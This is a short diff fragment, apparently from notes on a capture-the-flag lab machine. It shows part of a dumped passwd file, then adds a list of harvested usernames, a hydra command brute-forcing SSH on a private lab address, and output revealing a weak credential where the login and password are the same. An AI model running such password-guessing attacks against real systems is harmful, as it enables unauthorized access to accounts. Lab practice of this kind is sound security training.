@@ -146,3 +146,33 @@ www:x:1028:1028::/home/www:
 postfix:x:112:118::/var/spool/postfix:/bin/false
 ftp:x:110:116:ftp daemon,,,:/var/ftp:/bin/false
 elly:x:1029:1029::/home/elly:/bin/bash
+
+peter
+RNunemaker
+ETollefson
+DSwanger
+AParnell
+SHayslett
+MBassin
+JBare
+LSolum
+MFrei
+SStroud
+CCeaser
+JKanode
+CJoo
+JLipps
+jamie
+Sam
+Drew
+jess
+SHAY
+Taylor
+mel
+kai
+zoe
+NATHAN
+elly
+
+hydra -L users.txt -e nsr ssh://192.168.1.92 -v
+  [22][ssh] host: 192.168.1.92   login: SHayslett   password: SHayslett
